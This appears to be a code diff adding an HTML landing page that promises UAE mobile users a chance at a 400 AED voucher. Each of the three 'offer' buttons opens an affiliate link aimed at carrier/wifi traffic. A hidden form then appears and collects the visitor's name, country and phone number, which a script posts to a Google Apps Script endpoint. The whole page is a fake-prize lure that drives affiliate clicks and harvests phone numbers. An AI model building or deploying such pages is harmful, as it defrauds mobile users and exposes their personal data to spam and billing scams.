@@ -1,0 +1,161 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>UAE_Carrier_wifi</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to bottom, #ffffff, #f2f2f2);
+      text-align: center;
+      color: #333;
+    }
+
+    h1 {
+      padding: 20px;
+      font-size: 1.5rem;
+      color: #007BFF;
+    }
+
+    h2 {
+      font-size: 1.3rem;
+      color: #e91e63;
+      margin: 10px 20px;
+    }
+
+    h3 {
+      font-size: 1rem;
+      color: #333;
+      margin: 10px 20px;
+    }
+
+    .button-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 20px;
+      margin-top: 30px;
+    }
+
+    .offer-button {
+      width: 80%;
+      padding: 15px;
+      font-size: 1.2rem;
+      background-color: #28a745;
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      animation: pulse 2s infinite;
+      transition: transform 0.2s;
+    }
+
+    .offer-button:hover {
+      transform: scale(1.05);
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.03); }
+      100% { transform: scale(1); }
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 30px;
+      gap: 10px;
+    }
+
+    input {
+      padding: 10px;
+      width: 80%;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+
+    .submit-button {
+      background-color: #007BFF;
+      color: white;
+      border: none;
+      padding: 12px;
+      border-radius: 8px;
+      font-size: 1rem;
+      cursor: pointer;
+    }
+
+    footer {
+      margin: 40px 0 20px;
+      font-weight: bold;
+      font-size: 1.1rem;
+      color: red;
+    }
+  </style>
+</head>
+<body>
+  <h1>Add your phone number and confirm the SMS code</h1>
+  <h2>And get chance for 400 AED voucher</h2>
+  <h3>Complete the 3 offers then add your name and phone to contact you</h3>
+
+  <div class="button-container" id="buttons">
+    <button class="offer-button" onclick="openOffer(1)">Offer 1</button>
+    <button class="offer-button" onclick="openOffer(2)">Offer 2</button>
+    <button class="offer-button" onclick="openOffer(3)">Offer 3</button>
+  </div>
+
+  <div id="form-container" class="hidden">
+    <form id="userForm">
+      <input type="text" name="name" placeholder="Your Name" required />
+      <input type="text" name="country" placeholder="Country" required />
+      <input type="tel" name="phone" placeholder="Mobile Number" required />
+      <button class="submit-button" type="submit">Submit</button>
+    </form>
+  </div>
+
+  <footer>Limited offer</footer>
+
+  <script>
+    const offerUrls = [
+      "https://aff.monymakers.online/?utm_medium=e536e56c1ffd1fc8133c0211a4e2c0edde9b1795&utm_campaign=target_AE_c8f43d_wifi&np=1",
+      "https://aff.monymakers.online/?utm_medium=28470715e92b9df4d5b49e691293d382e163472e&utm_campaign=target_AE_d77b39_wifi&np=1",
+      "https://aff.monymakers.online/?utm_medium=57b1ff3e1f746e42f3b73051a72444dd7acb59fd&utm_campaign=target_AE_4aafb5_wifi&np=1"
+    ];
+
+    let completedOffers = 0;
+
+    function openOffer(index) {
+      const tokens = `&subid=123&clickid=abc&keyword=test&target=carrier&source=landing&geo=AE&device=mobile&os=android`;
+      window.open(offerUrls[index - 1] + tokens, '_blank');
+      completedOffers++;
+      if (completedOffers >= 3) {
+        document.getElementById('form-container').classList.remove('hidden');
+      }
+    }
+
+    document.getElementById('userForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const formData = new FormData(e.target);
+      const data = Object.fromEntries(formData.entries());
+
+      const scriptURL = 'https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec';
+      fetch(scriptURL, {
+        method: 'POST',
+        body: new URLSearchParams(data)
+      })
+      .then(response => alert("Thank you! You'll be contacted if you win."))
+      .catch(error => alert('Error!', error.message));
+    });
+  </script>
+</body>
+</html>
